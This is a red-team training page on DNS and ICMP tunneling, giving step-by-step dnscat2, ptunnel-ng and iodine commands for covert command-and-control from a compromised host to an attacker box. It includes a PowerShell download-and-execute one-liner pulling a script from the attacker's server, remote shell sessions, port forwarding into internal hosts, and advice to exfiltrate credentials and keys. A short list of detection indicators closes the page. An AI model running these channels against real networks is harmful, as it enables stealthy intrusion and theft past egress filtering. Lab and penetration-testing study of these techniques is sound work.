---
layout: training-page
title: "DNS & ICMP Tunneling — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - dns-tunneling
  - dnscat2
  - icmp-tunneling
  - ptunnel-ng
page_key: "pivoting-dns-icmp-tunneling"
render_with_liquid: false
---

# DNS & ICMP Tunneling

## Overview

DNS and ICMP tunneling are covert channel techniques for exfiltrating data or establishing C2 communication through protocols that are rarely inspected by firewalls. DNS tunneling encodes data in DNS query/response records; ICMP tunneling hides data in ping packet payloads. Both are significantly slower than TCP tunneling but can bypass restrictive egress filtering where only DNS (UDP/53) or ICMP is permitted outbound.

![DNS and ICMP covert channel tunneling: pivot host encodes data in DNS queries or ICMP ping payloads through firewall to attacker-controlled nameserver or proxy server](/images/pivoting/dns-icmp-tunnel.svg)  
*// covert channel tunneling — dns and icmp bypass egress filtering*

## DNS Tunneling Concepts

DNS queries can carry arbitrary data in labels and record types (TXT, MX, CNAME). A DNS tunnel encodes TCP data into DNS queries sent to a nameserver you control. The nameserver decodes the queries and forwards the traffic to its destination, responding with encoded data in the DNS reply.

```
# DNS tunnel data flow:
# Client → DNS query (encoded data) → Your NS → Decode → Internet
# Client ← DNS reply (encoded data) ← Your NS ← Encode ← Internet

# Requirements:
# 1. A domain you control (e.g., tunnel.example.com)
# 2. An NS record pointing tunnel.example.com → your server
# 3. dnscat2 server running on your server
# 4. dnscat2 client on the compromised host

# DNS setup (in registrar/DNS provider):
# A    ns1.tunnel.example.com  →  YOUR_SERVER_IP
# NS   tunnel.example.com      →  ns1.tunnel.example.com
```

## dnscat2 — DNS C2 Tunnel

dnscat2 creates an encrypted command-and-control channel over DNS. The server runs on your attack box (acts as the DNS resolver). The client runs on the compromised host and queries your DNS server, encoding session data in DNS labels.

```
># ── Server (Attack Box) ───────────────────────────────────────
# Install dnscat2 server:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Start dnscat2 server:
# Using a registered domain (preferred — traffic looks like real DNS):
sudo ruby dnscat2.rb --dns host=10.10.14.5,port=53,domain=tunnel.example.com --no-cache

# Direct mode (no domain required — client connects directly):
sudo ruby dnscat2.rb --dns host=10.10.14.5,port=53 --no-cache
# Note the pre-shared secret printed at startup

# ── Client (Compromised Host — Linux) ─────────────────────────
# Compile dnscat2 client:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Connect using domain (queries go through normal DNS):
./dnscat --dns domain=tunnel.example.com

# Connect directly to server (no domain needed):
./dnscat --dns server=10.10.14.5,port=53 --secret=PRESHARED_SECRET
```

## dnscat2 Session Management

After the client connects, dnscat2 opens an encrypted session. Use the server console to interact with sessions and run commands.

```
># dnscat2 server console commands:
dnscat2> sessions           # list active sessions
dnscat2> session -i 1       # interact with session 1

# Within a session — exec shell:
dnscat2 session 1> shell    # open command shell sub-session
dnscat2 session 2> ?        # help

# Within shell session:
command (session 2)> exec cmd.exe   # Windows shell
command (session 2)> exec /bin/bash # Linux shell

# Port forwarding through dnscat2:
dnscat2 session 1> listen 127.0.0.1:8080 172.16.5.100:80
# Creates local port 8080 that forwards to 172.16.5.100:80 via DNS tunnel

dnscat2 session 1> listen 127.0.0.1:3389 172.16.5.19:3389
# RDP through DNS tunnel (very slow — use sparingly)
```

## dnscat2 on Windows

A PowerShell-based dnscat2 client exists for Windows targets where you can't drop a binary.

```
># PowerShell dnscat2 client:
# https://github.com/lukebaggett/dnscat2-powershell

# Download and execute (on Windows pivot):
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/dnscat2.ps1')
Start-Dnscat2 -DNSserver 10.10.14.5 -Domain tunnel.example.com -PreSharedSecret SECRET -Exec cmd

# Or: Import-Module then call:
Import-Module .\dnscat2.ps1
Start-Dnscat2 -Domain tunnel.example.com -DNSserver 10.10.14.5
```

## ICMP Tunneling — ptunnel-ng

ICMP tunneling encodes TCP data in ICMP echo request/reply packets (ping). Useful when only ICMP is allowed outbound from a network. `ptunnel-ng` is the maintained fork of ptunnel and supports authentication.

```
># Install ptunnel-ng:
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
cmake .
make

# ── Server (Attack Box) ───────────────────────────────────────
# Start ptunnel-ng server (requires root — binds to raw socket):
sudo ./ptunnel-ng -r10.10.14.5 -R22
# -r: server IP (your attack box)
# -R: port to forward to (SSH port 22 on server)

# With authentication (password):
sudo ./ptunnel-ng -r10.10.14.5 -R22 -a 'SecretPassword'

# ── Client (Compromised Host) ─────────────────────────────────
# Connect to ptunnel-ng server:
./ptunnel-ng -p10.10.14.5 -l2222 -r10.10.14.5 -R22
# -p: proxy (server) address
# -l: local port to open
# -r: remote host to reach via server
# -R: remote port

# With authentication:
./ptunnel-ng -p10.10.14.5 -l2222 -r10.10.14.5 -R22 -a 'SecretPassword'

# ── Attack Box ────────────────────────────────────────────────
# SSH through the ICMP tunnel (via local port 2222):
ssh -p 2222 -l ubuntu localhost

# Once SSH is up, create a dynamic forward through the ICMP tunnel:
ssh -D 9050 -p 2222 -l ubuntu localhost
proxychains nmap -sT 172.16.5.0/24
```

## Iodine — IP-over-DNS Tunnel

Iodine creates a full IP tunnel over DNS, not just a C2 channel. It assigns a real IP to your attack box and the tunnel endpoint, allowing you to run any TCP/UDP application through it without a SOCKS proxy. Slower than dnscat2 for interactive sessions but more flexible for arbitrary traffic.

```
# Requirements: domain with NS record → your server (same as dnscat2)

# ── Server (Attack Box) ───────────────────────────────────────
sudo apt install iodine
sudo iodined -f -c -P password 10.0.0.1 tunnel.example.com
# -f: foreground
# -c: disable client IP verification
# -P: tunnel password
# 10.0.0.1: IP to assign to the server tunnel interface (dns0)
# Creates: dns0 interface at 10.0.0.1/24

# ── Client (Compromised Host) ─────────────────────────────────
sudo iodine -f -P password tunnel.example.com
# Connects via DNS to your server
# Creates dns0 interface with IP in 10.0.0.0/24 (assigned by server)

# ── Attack Box — use the iodine tunnel ────────────────────────
# SSH through the iodine tunnel IP (assigned to client):
ssh ubuntu@10.0.0.2
# Once SSH up, port forward or SOCKS proxy as needed:
ssh -D 9050 ubuntu@10.0.0.2
proxychains nmap -sT 172.16.5.0/24

# Iodine vs dnscat2:
# iodine: real IP tunnel, requires compiled binary, better throughput
# dnscat2: C2 channel + port forward, Ruby server, easier to set up
```

## Performance Notes and Detection

DNS and ICMP tunnels are significantly slower than TCP-based tunnels. Use them only when no other option exists. Both are detectable by anomaly-based inspection.

```
># DNS tunneling detection indicators:
# - Unusually long DNS query labels (dnscat encodes in labels up to 63 chars)
# - High volume of DNS TXT/NULL record queries
# - DNS queries to unusual or newly registered domains
# - Single host generating disproportionate DNS query volume

# ICMP tunneling detection indicators:
# - ICMP packets with unusually large payloads (>64 bytes)
# - ICMP packets with non-standard payload content (not zeros/pattern)
# - High ICMP volume from internal host
# - ICMP to single external IP at regular intervals

# Bandwidth expectations:
# DNS tunnel:  ~3 KB/s usable (limited by DNS query rate + encoding overhead)
# ICMP tunnel: ~1-4 KB/s depending on kernel and network path

# Operational recommendation:
# Use DNS/ICMP tunneling only for:
# - C2 keep-alive when TCP is blocked
# - Small data exfil (credentials, keys, configs)
# - Session setup — then switch to faster protocol
# Avoid for: large transfers, interactive tools requiring low latency
```
